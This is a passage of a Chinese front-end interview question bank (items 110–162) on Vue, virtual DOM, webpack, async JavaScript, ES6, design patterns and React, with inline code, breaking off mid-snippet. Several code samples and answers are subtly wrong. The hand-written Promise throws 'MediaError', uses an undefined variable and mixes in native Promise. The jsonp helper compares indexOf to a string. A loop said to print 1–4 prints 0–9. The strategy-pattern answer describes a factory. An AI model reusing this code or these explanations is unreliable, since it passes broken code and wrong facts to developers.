通过使用双向数据绑定，来实现了 View 和 Model 的同步更新。vue 的双向数据绑定主要是通过使用数据劫持和发布订阅者模式来实现的。 首先我们通过 Object.defineProperty() 方法来对 Model 数据各个属性添加访问器属性，以此来实现数据的劫持，因此当 Model 中的数据发生变化的时候，我们可以通过配置的 setter 和 getter 方法来实现对 View 层数据更新的通知。 数据在 html 模板中一共有两种绑定情况，一种是使用 v-model 来对 value 值进行绑定，一种是作为文本绑定，在对模板引擎进行解析的过程中。如果遇到元素节点，并且属性值包含 v-model 的话，我们就从 Model 中去获取 v-model 所对应的属性的值，并赋值给元素的value 值。然后给这个元素设置一个监听事件，当 View 中元素的数据发生变化的时候触发该事件，通知 Model 中的对应的属性的值进行更新。 如果遇到了绑定的文本节点，我们使用 Model 中对应的属性的值来替换这个文本。对于文本节点的更新，我们使用了发布订阅者模式，属性作为一个主题，我们为这个节点设置一个订阅者对象，将这个订阅者对象加入这个属性主题的订阅者列表中。当 Model 层数据发生改变的时候，Model 作为发布者向主题发出通知，主题收到通知再向它的所有订阅者推送，订阅者收到通知后更改自己的数据。 110. Object.defineProperty 介绍？ Object.defineProperty 函数一共有三个参数，第一个参数是需要定义属性的对象，第二个参数是需要定义的属性，第三个是该属性描述符。 一个属性的描述符有四个属性，分别是 value 属性的值，writable 属性是否可写，enumerable 属性是否可枚举，configurable 属性是否可配置修改。 111. 使用 Object.defineProperty() 来进行数据劫持有什么缺点？有一些对属性的操作，使用这种方法无法拦截，比如说通过下标方式修改数组数据或者给对象新增属性，vue 内部通过重写函数解决了这个问题。在 Vue3.0 中已经不使用这种方式了，而是通过使用 Proxy 对对象进行代理，从而实现数据劫持。使用 Proxy 的好处是它可以完美的监听到任何方式的数据改变，唯一的缺点是兼容性的问题，因为这是 ES6 的语法。 112. 什么是 Virtual DOM？为什么 Virtual DOM 比原生 DOM 快？ 众所周知，操作 DOM 是很耗费性能的一件事情，既然如此，我们可以考虑通过 JS 对象来模拟 DOM 对象，毕竟操作 JS 对象比操作 DOM 省时的多 当页面的状态发生改变，我们需要对页面的 DOM 的结构进行调整的时候，我们首先根据变更的状态，重新构建起一棵对象树，然后将这棵新的对象树和旧的对象树进行比较，记录下两棵树的的差异。 最后将记录的有差异的地方应用到真正的 DOM 树中去，这样视图就更新了。 我认为 Virtual DOM 这种方法对于我们需要有大量的 DOM 操作的时候，能够很好的提高我们的操作效率，通过在操作前确定需要做的最小修改，尽可能的减少 DOM 操作带来的重流和重绘的影响。其实 Virtual DOM 并不一定比我们真实的操作 DOM 要快，这种方法的目的是为了提高我们开发时的可维护性，在任意的情况下，都能保证一个尽量小的性能消耗去进行操作。 113. 如何比较两个 DOM 树的差异？ 两个树的完全 diff 算法的时间复杂度为 O(n^3) ，但是在前端中，我们很少会跨层级的移动元素，所以我们只需要比较同一层级的元素进行比较，这样就可以将算法的时间复杂度降低为 O(n)。 算法首先会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个序号。在深度遍历的时候，每遍历到一个节点，我们就将这个节点和新的树中的节点进行比较，如果有差异，则将这个差异记录到一个对象中。 在对列表元素进行对比的时候，由于 TagName 是重复的，所以我们不能使用这个来对比。我们需要给每一个子节点加上一个 key，列表对比的时候使用 key 来进行比较，这样我们才能够复用老的 DOM 树上的节点。 114. 什么是 requestAnimationFrame ？ 详细资料可以参考： 《你需要知道的 requestAnimationFrame》 《CSS3 动画那么强，requestAnimationFrame 还有毛线用？》 115. 谈谈你对 webpack 的看法 我当时使用 webpack 的一个最主要原因是为了简化页面依赖的管理，并且通过将其打包为一个文件来降低页面加载时请求的资源数。 我认为 webpack 的主要原理是，它将所有的资源都看成是一个模块，并且把页面逻辑当作一个整体，通过一个给定的入口文件，webpack 从这个文件开始，找到所有的依赖文件，将各个依赖文件模块通过 loader 和 plugins 处理后，然后打包在一起，最后输出一个浏览器可识别的 JS 文件。 Webpack 具有四个核心的概念，分别是 Entry（入口）、Output（输出）、loader 和 Plugins（插件）。 Entry 是 webpack 的入口起点，它指示 webpack 应该从哪个模块开始着手，来作为其构建内部依赖图的开始。 Output 属性告诉 webpack 在哪里输出它所创建的打包文件，也可指定打包文件的名称，默认位置为 ./dist。 loader 可以理解为 webpack 的编译器，它使得 webpack 可以处理一些非 JavaScript 文件。在对 loader 进行配置的时候，test 属性，标志有哪些后缀的文件应该被处理，是一个正则表达式。use 属性，指定 test 类型的文件应该使用哪个 loader 进行预处理。常用的 loader 有 css-loader、style-loader 等。 插件可以用于执行范围更广的任务，包括打包、优化、压缩、搭建服务器等等，要使用一个插件，一般是先使用 npm 包管理器进行安装，然后在配置文件中引入，最后将其实例化后传递给 plugins 数组属性。 使用 webpack 的确能够提供我们对于项目的管理，但是它的缺点就是调试和配置起来太麻烦了。但现在 webpack4.0 的免配置一定程度上解决了这个问题。但是我感觉就是对我来说，就是一个黑盒，很多时候出现了问题，没有办法很好的定位。 116. offsetWidth/offsetHeight,Width/clientHeight 与 scrollWidth/scrollHeight 的区别？ clientWidth/clientHeight 返回的是元素的内部宽度，它的值只包含 content + padding，如果有滚动条，不包含滚动条。clientTop 返回的是上边框的宽度。clientLeft 返回的左边框的宽度。 offsetWidth/offsetHeight 返回的是元素的布局宽度，它的值包含 content + padding + border 包含了滚动条。offsetTop 返回的是当前元素相对于其 offsetParent 元素的顶部的距离。offsetLeft 返回的是当前元素相对于其 offsetParent 元素的左部的距离。 scrollWidth/scrollHeight 返回值包含 content + padding + 溢出内容的尺寸。scrollTop 属性返回的是一个元素的内容垂直滚动的像素数。scrollLeft 属性返回的是元素滚动条到元素左边的距离。 117. 谈一谈你理解的函数式编程？ 简单说，”函数式编程”是一种”编程范式”（programming paradigm），也就是如何编写程序的方法论。 它具有以下特性：闭包和高阶函数、惰性计算、递归、函数是”第一等公民”、只用”表达式”。 详细资料可以参考： 《函数式编程初探》 118. 异步编程的实现方式？js 中的异步机制可以分为以下几种 第一种最常见的是使用回调函数的方式，使用回调函数的方式有一个缺点是，多个回调函数嵌套的时候会造成回调函数地狱，上下两层的回调函数间的代码耦合度太高，不利于代码的可维护。 第二种是 Promise 的方式，使用 Promise 的方式可以将嵌套的回调函数作为链式调用。但是使用这种方法，有时会造成多个 then 的链式调用，可能会造成代码的语义不够明确。 第三种是使用 generator 的方式，它可以在函数的执行过程中，将函数的执行权转移出去，在函数外部我们还可以将执行权转移回来。当我们遇到异步函数执行的时候，将函数执行权转移出去，当异步函数执行完毕的时候我们再将执行权给转移回来。因此我们在 generator 内部对于异步操作的方式，可以以同步的顺序来书写。使用这种方式我们需要考虑的问题是何时将函数的控制权转移回来，因此我们需要有一个自动执行 generator 的机制，比如说 co 模块等方式来实现 generator 的自动执行。 第四种是使用 async 函数的形式，async 函数是 generator 和 promise 实现的一个自动执行的语法糖，它内部自带执行器，当函数内部执行到一个 await 语句的时候，如果语句返回一个 promise 对象，那么函数将会等待 promise 对象的状态变为 resolve 后再继续向下执行。因此我们可以将异步逻辑，转化为同步的顺序来书写，并且这个函数可以自动执行。 119. Js 动画与 CSS 动画区别及相应实现CSS3 的动画的优点 在性能上会稍微好一些，浏览器会对 CSS3 的动画做一些优化代码相对简单 缺点 在动画控制上不够灵活兼容性不好 JavaScript 的动画正好弥补了这两个缺点，控制能力很强，可以单帧的控制、变换，同时写得好完全可以兼容 IE6，并且功能强大。对于一些复杂控制的动画，使用 javascript 会比较靠谱。而在实现一些小的交互动效的时候，就多考虑考虑 CSS 吧 120. get 请求传参长度的误区 （1）HTTP 协议未规定 GET 和 POST 的长度限制（2）GET 的最大长度显示是因为浏览器和 web 服务器限制了 URI 的长度（3）不同的浏览器和 WEB 服务器，限制的最大长度不一样（4）要支持 IE，则最大长度为 2083byte，若只支持 Chrome，则最大长度 8182byte 121. URL 和 URI 的区别？ URI: Uniform Resource Identifier 指的是统一资源标识符URL: Uniform Resource Location 指的是统一资源定位符 URI 指的是统一资源标识符，用唯一的标识来确定一个资源，它是一种抽象的定义，也就是说，不管使用什么方法来定义，只要能唯一的标识一个资源，就可以称为 URI。 URL 指的是统一资源定位符, URL是 URI 的子集，URL 可以理解为使用地址来标识资源 122. get 和 post 请求在缓存方面的区别 缓存一般只适用于那些不会更新服务端数据的请求。一般 get 请求都是查找请求，不会对服务器资源数据造成修改，而 post 请求一般都会对服务器数据造成修改，所以，一般会对 get 请求进行缓存，很少会对 post 请求进行缓存。 123. 图片的懒加载和预加载 懒加载也叫延迟加载，指的是在长网页中延迟加载图片的时机，当用户需要访问时，再去加载，这样可以提高网站的首屏加载速度，提升用户的体验，并且可以减少服务器的压力。它适用于图片很多，页面很长的电商网站的场景。懒加载的实现原理是，将页面上的图片的 src 属性设置为空字符串，将图片的真实路径保存在一个自定义属性中，当页面滚动的时候，进行判断，如果图片进入页面可视区域内，则从自定义属性中取出真实路径赋值给图片的 src 属性，以此来实现图片的延迟加载。 预加载指的是将所需的资源提前请求加载到本地，这样后面在需要用到时就直接从缓存取资源。通过预加载能够减少用户的等待时间，提高用户的体验。我了解的预加载的最常用的方式是使用 js 中的 image 对象，通过为 image 对象来设置 scr 属性，来实现图片的预加载。 这两种方式都是提高网页性能的方式，两者主要区别是一个是提前加载，一个是迟缓甚至不加载。懒加载对服务器前端有一定的缓解压力作用，预加载则会增加服务器前端压力。 124. mouseover 和 mouseenter 的区别？ 当鼠标移动到元素上时就会触发 mouseenter 事件，类似 mouseover，它们两者之间的差别是 mouseenter 不会冒泡。 由于 mouseenter 不支持事件冒泡，导致在一个元素的子元素上进入或离开的时候会触发其 mouseover 和 mouseout 事件，但是却不会触发 mouseenter 和 mouseleave 事件。 125. js 拖拽功能的实现 一个元素的拖拽过程，我们可以分为三个步骤，第一步是鼠标按下目标元素，第二步是鼠标保持按下的状态移动鼠标，第三步是鼠标抬起，拖拽过程结束。 这三步分别对应了三个事件，mousedown 事件，mousemove 事件和 mouseup 事件。只有在鼠标按下的状态移动鼠标我们才会执行拖拽事件，因此我们需要在 mousedown 事件中设置一个状态来标识鼠标已经按下，然后在 mouseup 事件中再取消这个状态。 在 mousedown 事件中我们首先应该判断，目标元素是否为拖拽元素，如果是拖拽元素，我们就设置状态并且保存这个时候鼠标的位置。然后在 mousemove 事件中，我们通过判断鼠标现在的位置和以前位置的相对移动，来确定拖拽元素在移动中的坐标。最后 mouseup 事件触发后，清除状态，结束拖拽事件。 126. 为什么使用 setTimeout 实现 setInterval？怎么模拟？12345678910111213141516171819//思路是使用递归函数，不断地去执行 setTimeout 从而达到 setInterval 的效果function mySetInterval(fn, timeout) &#123; // 控制器，控制定时器是否继续执行 var timer = &#123; flag: true &#125;; // 设置递归函数，模拟定时器执行。 function interval() &#123; if (timer.flag) &#123; fn(); setTimeout(interval, timeout); &#125; &#125; // 启动定时器 setTimeout(interval, timeout); // 返回控制器 return timer;&#125; 回答： setInterval 的作用是每隔一段指定时间执行一个函数，但是这个执行不是真的到了时间立即执行，它真正的作用是每隔一段时间将事件加入事件队列中去，只有当当前的执行栈为空的时候，才能去从事件队列中取出事件执行。 所以可能会出现这样的情况，就是当前执行栈执行的时间很长，导致事件队列里边积累多个定时器加入的事件，当执行栈结束的时候，这些事件会依次执行，因此就不能到间隔一段时间执行的效果。 针对 setInterval 的这个缺点，我们可以使用 setTimeout 递归调用来模拟 setInterval，这样我们就确保了只有一个事件结束了，我们才会触发下一个定时器事件，这样解决了 setInterval 的问题。 127. let 和 const 的注意点？ （1）声明的变量只在声明时的代码块内有效（2）不存在声明提升（3）存在暂时性死区，如果在变量声明前使用，会报错（4）不允许重复声明，重复声明会报错 128. 什么是 rest 参数？ rest 参数（形式为…变量名），用于获取函数的多余参数。 129. 什么是尾调用，使用尾调用有什么好处？ 尾调用指的是函数的最后一步调用另一个函数。 我们代码执行是基于执行栈的，所以当我们在一个函数里调用另一个函数时，我们会保留当前的执行上下文，然后再新建另外一个执行上下文加入栈中。使用尾调用的话，因为已经是函数的最后一步，所以这个时候我们可以不必再保留当前的执行上下文，从而节省了内存，这就是尾调用优化。 但是 ES6 的尾调用优化只在严格模式下开启， 130. Symbol 类型的注意点？（1）Symbol 函数前不能使用 new 命令，否则会报错。 （2）Symbol 函数可以接受一个字符串作为参数，表示对 Symbol 实例的描述，主要是为了在控制台显示，或者转为字符串时， 比较容易区分。 （3）Symbol 作为属性名，该属性不会出现在 for...in、for...of 循环中，也不会被 Object.keys()、Object.getOw nPropertyNames()、JSON.stringify() 返回。 （4）Object.getOwnPropertySymbols 方法返回一个数组，成员是当前对象的所有用作属性名的 Symbol 值。 （5）Symbol.for 接受一个字符串作为参数，然后搜索有没有以该参数作为名称的 Symbol 值。如果有，就返回这个 Symbol 值，否则就新建并返回一个以该字符串为名称的 Symbol 值。 （6）Symbol.keyFor 方法返回一个已登记的 Symbol 类型值的 key。 131. Set ES6 提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。 132. Map Map 数据结构。它类似于对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键。 133. 什么是 Proxy ？ Proxy 用于修改某些操作的默认行为，等同于在语言层面做出修改，所以属于一种“元编程”，即对编程语言进行编程。 Proxy 可以理解成，在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，因此提供了一种机制，可以对外界的访问进行过滤和改写。Proxy 这个词的原意是代理，用在这里表示由它来“代理”某些操作，可以译为“代理器”。 134. Reflect 对象创建目的？ （1）将 Object 对象的一些明显属于语言内部的方法（比如 Object.defineProperty），放到 Reflect 对象上。 （2）修改某些 Object 方法的返回结果，让其变得更合理。 （3）让 Object 操作都变成函数行为。 （4）Reflect 对象的方法与 Proxy 对象的方法一一对应，只要是 Proxy 对象的方法，就能在 Reflect 对象上找到对应的方法。这就让 Proxy 对象可以方便地调用对应的 Reflect 方法，完成默认行为，作为修改行为的基础。也就是说，不管 Proxy 怎么修改默认行为，你总可以在 Reflect 上获取默认行为。 135. require 模块引入的查找方式？当 Node 遇到 require(X) 时，按下面的顺序处理。 （1）如果 X 是内置模块（比如 require(‘http’)）a. 返回该模块。b. 不再继续执行。 （2）如果 X 以 “./“ 或者 “/“ 或者 “../“ 开头a. 根据 X 所在的父模块，确定 X 的绝对路径。b. 将 X 当成文件，依次查找下面文件，只要其中有一个存在，就返回该文件，不再继续执行。XX.jsX.jsonX.nodec. 将 X 当成目录，依次查找下面文件，只要其中有一个存在，就返回该文件，不再继续执行。X/package.json（main字段）X/index.jsX/index.jsonX/index.node （3）如果 X 不带路径a. 根据 X 所在的父模块，确定 X 可能的安装目录。b. 依次在每个目录中，将 X 当成文件名或目录名加载。 （4）抛出 “not found” 136. 什么是 Promise 对象，什么是 Promises/A+ 规范 Promise 对象是异步编程的一种解决方案，最早由社区提出。Promises/A+ 规范是 JavaScript Promise 的标准，规定了一个 Promise 所必须具有的特性。 Promise 是一个构造函数，接收一个函数作为参数，返回一个 Promise 实例。一个 Promise 实例有三种状态，分别是 pending、resolved 和 rejected，分别代表了进行中、已成功和已失败。实例的状态只能由 pending 转变 resolved 或者 rejected 状态，并且状态一经改变，就凝固了，无法再被改变了。状态的改变是通过 resolve() 和 reject() 函数来实现的，我们可以在异步操作结束后调用这两个函数改变 Promise 实例的状态，它的原型上定义了一个 then 方法，使用这个 then 方法可以为两个状态的改变注册回调函数。这个回调函数属于微任务，会在本轮事件循环的末尾执行。 137. 手写一个 Promise123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116function myPromise(fun)&#123; let self = this this.value = undefined this.err = undefined this.funstack = [] this.errsatck = [] this.status = 'pending' function resolve(a)&#123; if(self.status === 'pending')&#123; self.value = a self.status = 'resolved' self.funstack.forEach(fn =&gt; fn()) &#125; &#125; function reject(e)&#123; if(self.status === 'pending')&#123; self.err = e self.status = 'rejected' self.errsatck.forEach(fn =&gt; fn()) &#125; &#125; try&#123; fun(resolve, reject) &#125;catch(err)&#123; reject(err) &#125;&#125;myPromise.prototype.then = function(infuil, inreject)&#123; let self = this, promise2 typeof infuil === 'function' ? infuil : function(val)&#123; return val &#125; typeof inreject === 'function' ? inreject : function(err)&#123; throw MediaError &#125; if(self.status === 'resolved')&#123; promise2 = new myPromise(function(resolve, reject)&#123; setTimeout(function()&#123; try&#123; let x = infuil(self.value) resolvePromise(p2, x, resolve, reject) &#125; catch(err)&#123; reject(err) &#125; &#125;) &#125;) &#125; if (this.status == 'rejected') &#123; promise2 = new Promise(function (resolve, reject) &#123; //x可能是一个promise，也可能是个普通值 setTimeout(function () &#123; try &#123; let x = inreject(self.err) resolvePromise(promise2, x, resolve, reject) &#125; catch (err) &#123; reject(err) &#125; &#125;); &#125;) &#125; if (this.status == 'pending') &#123; promise2 = new Promise(function (resolve, reject) &#123; self.funstack.push(function () &#123; //x可能是一个promise，也可能是个普通值 setTimeout(function () &#123; try &#123; let x = infuil(self.value) resolvePromise(promise2, x, resolve, reject) &#125; catch (err) &#123; reject(err) &#125; &#125;); &#125;) self.errsatck.push(function () &#123; //x可能是一个promise，也可能是个普通值 setTimeout(function () &#123; try &#123; let x = inreject(self.err) resolvePromise(promise2, x, resolve, reject) &#125; catch (err) &#123; reject(err) &#125; &#125;); &#125;) &#125;) &#125; return promise2&#125;function resolvePromise(p, x, re, rj)&#123; if(x !== null &amp;&amp; (p === x))&#123; re(new TypeError('typeerror')) &#125; if(x !== null &amp;&amp; (typeof x === 'function' || typeof x === 'object'))&#123; let then = x.then if(typeof then === 'function')&#123; then.call(x, function(y)&#123; resolvePromise(p, y, re, rj) &#125;, function(e)&#123; rj(e) &#125;) &#125; else&#123; re(x) &#125; &#125; else&#123; re(x) &#125;&#125; 138. 如何检测浏览器所支持的最小字体大小？ 用 JS 设置 DOM 的字体为某一个值，然后再取出来，如果值设置成功，就说明支持。 139. 怎么做 JS 代码 Error 统计？ error 统计使用浏览器的 window.error 事件。 140. 单例模式模式是什么？ 单例模式保证了全局只有一个实例来被访问。比如说常用的如弹框组件的实现和全局状态的实现。 141. 策略模式是什么？ 策略模式主要是用来将方法的实现和方法的调用分离开，外部通过不同的参数可以调用不同的策略。 可以想象一个场景。假设有一份很复杂的代码需要用户去调用，但是用户并不关心这些复杂的代码，只需要你提供给我一个接口去调用，用户只负责传递需要的参数，至于这些参数怎么使用，内部有什么逻辑是不关心的，只需要你最后返回我一个实例。这个构造过程就是工厂。 142. 装饰器模式是什么？ 装饰模式不需要改变已有的接口，作用是给对象添加功能。就像我们经常需要给手机戴个保护套防摔一样，不改变手机自身，给手机添加了保护套提供防摔功能。 143. 代理模式是什么 代理是为了控制对对象的访问，不让外部直接访问到对象。在现实生活中，也有很多代理的场景。比如你需要买一件国外的产品，这时候你可以通过代购来购买产品。在实际代码中其实代理的场景很多，也就不举框架中的例子了，比如事件代理就用到了代理模式 144. 适配器模式是什么？ 适配器用来解决两个接口不兼容的情况，不需要改变已有的接口，通过包装一层的方式实现两个接口的正常协作。假如我们需要一种新的接口返回方式，但是老的接口由于在太多地方已经使用了，不能随意更改，这个时候就可以使用适配器模式。比如我们需要一种自定义的时间返回格式，但是我们又不能对 js 时间格式化的接口进行修改，这个时候就可以使用适配器模式。 145. 观察者模式与发布订阅模式？ 发布-订阅模式也叫做观察者模式。通过一对一或者一对多的依赖关系，当对象发生改变时，订阅方都会收到通知。在现实生活中，也有很多类似场景，比如我需要在购物网站上购买一个产品，但是发现该产品目前处于缺货状态，这时候我可以点击有货通知的按钮，让网站在产品有货的时候通过短信通知我。 发布订阅模式其实属于广义上的观察者模式 在观察者模式中，观察者需要直接订阅目标事件。在目标发出内容改变的事件后，直接接收事件并作出响应。 而在发布订阅模式中，发布者和订阅者之间多了一个调度中心。调度中心一方面从发布者接收事件，另一方面向订阅者发布事件，订阅者需要在调度中心中订阅事件。通过调度中心实现了发布者和订阅者关系的解耦。使用发布订阅者模式更利于我们代码的可维护性。 146. React 中 keys 的作用是什么？ 在开发过程中，我们需要保证某个元素的 key 在其同级元素中具有唯一性。在 React Diff 算法中React 会借助元素的 Key 值来判断该元素是新近创建的还是被移动而来的元素，从而减少不必要的元素重渲染。在重渲染过程中，如果key一样，若组件属性有所变化，则react只更新组件对应的属性；没有变化则不更新，如果key不一样，则react先销毁该组件，然后重新创建该组件 因此我们绝不可忽视转换函数中 Key 的重要性 147.说一说Virtual DOM 首先说说为什么要使用Virturl DOM，因为操作真实DOM的耗费的性能代价太高，所以react内部使用js实现了一套dom结构，在每次操作在和真实dom之前，使用实现好的diff算法，对虚拟dom进行比较，递归找出有变化的dom节点，然后对其进行更新操作。为了实现虚拟DOM，我们需要把每一种节点类型抽象成对象，每一种节点类型有自己的属性，也就是prop，每次进行diff的时候，react会先比较该节点类型，假如节点类型不一样，那么react会直接删除该节点，然后直接创建新的节点插入到其中，假如节点类型一样，那么会比较prop是否有更新，假如有prop不一样，那么react会判定该节点有更新，那么重渲染该节点，然后在对其子节点进行比较，一层一层往下，直到没有子节点 148.react对diff算法的优化？三个方面tree diff （1）React通过updateDepth对Virtual DOM树进行层级控制。（2）对树分层比较，两棵树 只对同一层次节点 进行比较。如果该节点不存在时，则该节点及其子节点会被完全删除，不会再进一步比较。（3）只需遍历一次，就能完成整棵DOM树的比较。 层级控制 那么问题来了，如果DOM节点出现了跨层级操作,diff会咋办呢？答：diff只简单考虑同层级的节点位置变换，如果是跨层级的话，只有创建节点和删除节点的操作 官方建议不要进行DOM节点跨层级操作，可以通过CSS隐藏、显示节点，而不是真正地移除、添加DOM节点。 component diffReact对不同的组件间的比较，有三种策略 （1）同一类型的两个组件，按原策略（层级比较）继续比较Virtual DOM树即可。 （2）假如节点类型一样，那么会比较prop是否有更新，假如有prop不一样，那么react会判定该节点有更新，那么重渲染该节点。所以用户可以通过shouldComponentUpdate() 来判断是否需要判断计算。 （3）假如节点类型不一样，那么react会直接删除该节点，然后直接创建新的节点插入到其中 element diff 当节点处于同一层级时，diff提供三种节点操作：删除、插入、移动。 插入 插入：组件 C 不在集合（A,B）中，需要插入 删除 删除：（1）组件 D 在集合（A,B,D）中，但 D的节点已经更改，不能复用和更新，所以需要删除 旧的 D ，再创建新的。 （2）组件 D 之前在 集合（A,B,D）中，但集合变成新的集合（A,B）了，D 就需要被删除。 移动 移动：组件D已经在集合（A,B,C,D）里了，且集合更新时，D没有发生更新，只是位置改变，如新集合（A,D,B,C），D在第二个，无须像传统diff，让旧集合的第二个B和新集合的第二个D 比较，并且删除第二个位置的B，再在第二个位置插入D，而是 （对同一层级的同组子节点） 添加唯一key进行区分，移动即可。 149. react生命周期(fiber算法的角度来说) 在 V16 版本中引入了 Fiber 机制。这个机制一定程度上的影响了部分生命周期的调用，并且也引入了新的 2 个 API 来解决问题 在之前的版本中，如果你拥有一个很复杂的复合组件，然后改动了最上层组件的 state，那么调用栈可能会很长 调用栈过长，再加上中间进行了复杂的操作，就可能导致长时间阻塞主线程，带来不好的用户体验。Fiber 就是为了解决该问题而生 函数调用栈当中，每个函数为一个工作，每个工作被称为堆栈帧，它会一直工作，直到堆栈为空，无法中断。 所以我们需要一种增量渲染的调度，那么就需要重新实现一个堆栈帧的调度，这个堆栈帧可以按照自己的调度算法执行他们。另外由于这些堆栈是可以自己控制的，所以可以加入并发或者错误边界等功能。 因此 Fiber 就是重新实现的堆栈帧 Fiber 本质上是一个虚拟的堆栈帧，它将 recocilation （递归 diff），拆分成无数个小任务的算法；它随时能够停止，恢复。停止恢复的时机取决于当前的一帧（16ms）内，还有没有足够的时间允许计算。 对于如何区别优先级，React 有自己的一套逻辑。对于动画这种实时性很高的东西，也就是 16 ms 必须渲染一次保证不卡顿的情况下，React 会每 16 ms（以内） 暂停一下更新，返回来继续渲染动画 对于异步渲染，现在渲染有两个阶段：reconciliation(调和) 和 commit（提交） 。前者过程是可以打断的，后者不能暂停，会一直更新界面直到完成。 Reconciliation 阶段 componentWillMountcomponentWillReceivePropsshouldComponentUpdatecomponentWillUpdate Commit 阶段 componentDidMountcomponentDidUpdatecomponentWillUnmount 因为 Reconciliation 阶段是可以被打断的，所以 Reconciliation 阶段会执行的生命周期函数就可能会出现调用多次的情况，从而引起 Bug。由此对于 Reconciliation 阶段调用的几个函数，除了 shouldComponentUpdate 以外，其他都应该避免去使用，并且 V16 中也引入了新的 API 来解决这个问题。 getDerivedStateFromProps 用于替换 componentWillReceiveProps ，该函数会在初始化和 update 时被调用 getSnapshotBeforeUpdate 用于替换 componentWillUpdate ，该函数会在 update 后 DOM 更新前被调用，用于读取最新的 DOM 数据 150.说一说setState setState 在 React 中是经常使用的一个 API，但是它存在一些的问题经常会导致初学者出错，核心原因就是因为这个 API 是异步的。 首先 setState 的调用并不会马上引起 state 的改变，并且如果你一次调用了多个 setState ，那么结果可能并不如你期待的一样。 因此一般来说推荐使用函数作为setState的参数来代替直接传入对象的方式 123this.setState((prevState) =&gt; (&#123; count: prevState.count + 1 &#125;), () =&gt; &#123; console.log(this.state)&#125;) 151.说一说react的refs Refs 是 React 提供给我们的安全访问 DOM元素或者某个组件实例的句柄 以下是应该使用 refs 的情况： 需要管理焦点、选择文本或媒体播放时触发式动画与第三方 DOM 库集成 152.React 中的事件处理逻辑 为了解决跨浏览器兼容性问题，React 会将浏览器原生事件（Browser Native Event）封装为合成事件（SyntheticEvent）传入设置的事件处理器中。另外有意思的是，React 并没有直接将事件附着到子元素上，而是以单一事件监听器的方式将所有的事件发送到顶层进行处理。这样 React 在更新 DOM 的时候就不需要考虑如何去处理附着在 DOM 上的事件监听器，最终达到优化性能的目的 153. react性能优化方案 重写shouldComponentUpdate来避免不必要的dom操作使用 production 版本的react.js使用key来帮助React识别列表中所有子组件的最小变化使用create-react-app来构建项目，这会创建整个项目结构，并进行大量优化。 154. 说一下redux redux 是 React的一个状态管理库，它基于flux。 Redux简化了React中的单向数据流。 Redux将状态管理完全从React中抽象出来。 三个原则 单一事实来源：整个应用的状态存储在单个 store 中的对象/状态树里。单一状态树可以更容易地跟踪随时间的变化，并调试或检查应用程序。 状态是只读的：改变状态的唯一方法是去触发一个动作。动作是描述变化的普通 JS 对象。就像 state 是数据的最小表示一样，该操作是对数据更改的最小表示。 使用纯函数进行更改：为了指定状态树如何通过操作进行转换，你需要纯函数。纯函数是那些返回值仅取决于其参数值的函数。 155. 简述flux 思想Flux 的最大特点，就是数据的”单向流动”。 用户访问 ViewView发出用户的 ActionDispatcher 收到Action，要求 Store 进行相应的更新Store 更新后，发出一个”change”事件View 收到”change”事件后，更新页面 156. 简述一下react-hook React Hook是React 16.8中的新特性。它可以让你在不编写class组件的情况下使用state以及其他React特性（增强了函数式组件的功能）。 hook实际上就是JavaScript函数，但是使用时需要额外遵循以下两个原则： （1）只能在React函数组件中使用hook，或者是自定义hook中；（2）只能在函数的最外层调用hook，不要在循环、条件或者子函数中调用； 156+. 简述一下react-router-dom react-router-dom 提供两个路由器BrowserRouter和HashRoauter。前者基于Html5提供的history的API（pushState，replaceState，popState）实现的，后者基于hash段。 react-router-dom 组件 BrowserRouter 和 HashRouter 是路由器。Route 用于路由匹配。Link 组件用于在应用程序中创建链接。 它将在HTML中渲染为锚标记。NavLink是突出显示当前活动链接的特殊链接。Switch 不是必需的，但在组合路由时很有用。Redirect 用于强制路由重定向 157. 开发中常用的几种 Content-Type ？ （1）application/x-www-form-urlencoded浏览器的原生 form 表单，如果不设置 enctype 属性，那么最终就会以 application/x-www-form-urlencoded 方式提交数据。该种方式提交的数据放在 body 里面，数据按照 key1=val1&amp;key2=val2 的方式进行编码，key 和 val 都进行了 URL转码。 （2）multipart/form-data 该种方式也是一个常见的 POST 提交方式，通常表单上传文件时使用该种方式。 （3）application/json 告诉服务器消息主体是序列化后的 JSON 字符串。 （4）text/xml 该种方式主要用来提交 XML 格式的数据。 158. 如何封装一个 javascript 的类型判断函数？1234567891011121314151617function getType(value) &#123; // 判断数据是 null 的情况 if (value === null) &#123; return value + \"\"; &#125; // 判断数据是引用类型的情况 if (typeof value === \"object\") &#123; let valueClass = Object.prototype.toString.call(value), type = valueClass.split(\" \")[1].split(\"\"); type.pop(); return type.join(\"\").toLowerCase(); &#125; else &#123; // 判断数据是基本数据类型的情况和函数的情况 return typeof value; &#125;&#125; 159. 如何判断一个对象是否为空对象？123function checkNullObj (obj) &#123; return Object.keys(obj).length === 0;&#125; 160. 使用闭包实现每隔一秒打印 1,2,3,41234567891011121314//闭包for(var i = 0; i &lt; 10; i++)&#123; (function(i)&#123; setTimeout(() =&gt; &#123; console.log(i) &#125;, i * 1000); &#125;)(i)&#125;//es6for(let i = 0; i &lt; 10; i++)&#123; setTimeout(() =&gt; &#123; console.log(i) &#125;, i * 1000)&#125; 161. 手写一个 jsonp1234567891011121314151617181920212223242526272829303132333435function jsonp(url, params, callback) &#123;// 判断是否含有参数let queryString = url.indexOf(\"?\") === \"-1\" ? \"?\" : \"&amp;\";// 添加参数for (var k in params) &#123;if (params.hasOwnProperty(k)) &#123;queryString += k + \"=\" + params[k] + \"&amp;\";&#125;&#125;// 处理回调函数名let random = Math.random().toString().replace(\".\", \"\"),callbackName = \"myJsonp\" + random;// 添加回调函数queryString += \"callback=\" + callbackName;// 构建请求let scriptNode = document.createElement(\"script\");scriptNode.src = url + queryString;window[callbackName] = function () &#123;// 调用回调函数callback(...arguments);// 删除这个引入的脚本document.getElementsByTagName(\"head\")[0].removeChild(scriptNode);&#125;// 发起请求document.getElementsByTagName(\"head\")[0].appendChild(scriptNode);&#125; 详细资料可以参考： 《原生 jsonp 具体实现》 《jsonp 的原理与实现》 162. 手写一个观察者模式？ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849var events = (function () &#123; var topics = &#123;&#125;; return &#123; // 注册监听函数 subscribe: function (topic, handler) &#123; if 